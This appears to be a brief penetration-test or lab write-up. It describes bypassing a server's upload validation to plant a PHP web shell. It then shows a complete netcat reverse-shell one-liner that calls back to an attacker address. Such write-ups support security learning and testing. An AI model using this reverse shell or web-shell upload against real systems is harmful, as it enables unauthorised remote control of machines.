The following host 10.10.11.241:8080 was found to be vulnerable to remote code execution.
![[Pasted image 20240407131623.png]]
I was able to bypass the backend server side file validation checks by editing the request in burp suite and uploading the  following payload:
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

The below is evidence of the burp request and the shell
![[Pasted image 20240407131839.png]]

And the web shell being executed:
![[Pasted image 20240407131908.png]]

I was able to upgrade my shell to a more secure connection by using the following payload:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.28 6969 >/tmp/f
```

![[Pasted image 20240407134102.png]]